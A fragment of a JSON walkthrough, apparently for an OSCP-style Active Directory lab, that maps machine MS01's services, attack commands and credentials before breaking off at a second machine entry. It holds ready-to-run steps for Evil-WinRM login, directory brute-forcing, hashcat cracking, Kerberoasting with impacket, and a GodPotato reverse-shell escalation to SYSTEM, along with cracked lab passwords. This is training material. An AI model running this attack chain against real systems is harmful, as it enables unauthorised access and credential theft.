  "machines": [
    {
      "id":"ms01",
      "label":"MS01",
      "ip":"192.168.x.153",
      "os":"Windows",
      "role":"AD Entry (dual-NIC)",
      "networks":["external","internal"],
      "services":[
        {
          "port":22,"name":"SSH","version":"",
          "vulnerabilities":[
            {"type":"given-creds","summary":"SSH with Eric.Wallows given creds","leads_to":"local-user"}
          ],
          "commands":["ssh Eric.Wallows@192.168.x.153"]
        },
        {
          "port":5985,"name":"WinRM","version":"",
          "vulnerabilities":[
            {"type":"given-creds","summary":"Evil-WinRM with Eric.Wallows creds","leads_to":"local-user"}
          ],
          "commands":["evil-winrm -i 192.168.x.153 -u Eric.Wallows -p '<given_password>'"]
        },
        {
          "port":8000,"name":"Web (Partner)","version":"",
          "vulnerabilities":[
            {"type":"info-disclosure","summary":"feroxbuster /partner/db → SQLite with hashed credentials","leads_to":"credential-hunt"}
          ],
          "commands":[
            "feroxbuster -u http://192.168.x.153:8000 -w /usr/share/wordlists/dirb/common.txt",
            "curl http://192.168.x.153:8000/partner/db"
          ]
        }
      ],
      "privesc":[
        {
          "from":"Eric.Wallows",
          "to":"administrator",
          "technique":"admintool.exe panic message leaks admin MD5 hash → hashes.com → December31",
          "commands":[
            {"cmd": "admintool.exe whoami", "rationale": "Why: Trigger panic message that leaks admin MD5 hash"},
            "hashcat -m 0 <md5_hash> /usr/share/wordlists/rockyou.txt",
            "ssh administrator@192.168.x.153"
          ]
        },
        {
          "from":"web_svc",
          "to":"SYSTEM",
          "technique":"SeImpersonate → GodPotato (Kerberoast path)",
          "commands":[
            "upload rev.aspx",
            "GodPotato.exe -e EfsRpc -p C:\\tmp\\rev.exe"
          ]
        }
      ],
      "credentials":[
        {"user":"Eric.Wallows","type":"password","source":"given","unlocks":["ms01"]},
        {"user":"administrator","type":"password","source":"admintool.exe MD5 crack → December31","unlocks":["ms01-admin"]},
        {"user":"hghgib6vHT3bVWf","type":"password","source":"PowerShell history (support password)","unlocks":["ms02"]}
      ],
      "alternatives":[
        {"source":"C4","description":"Kerberoasting from MS01 via Ligolo-ng tunnel → web_svc TGS → hashcat → Diamond1","commands":["impacket-GetUserSPNs oscp.exam/Eric.Wallows -dc-ip 10.10.x.152 -request","hashcat -m 13100 web_svc.hash /usr/share/wordlists/rockyou.txt"]},
        {"source":"C1,C2","description":"Port 8000 SQLite DB credential extraction as alternative credential source"},
        {"source":"C3","description":"iox proxy instead of Ligolo-ng for pivot to 10.10.x.0/24"}
      ]
    },
    {
      "id":"ms02",
      "label":"MS02",
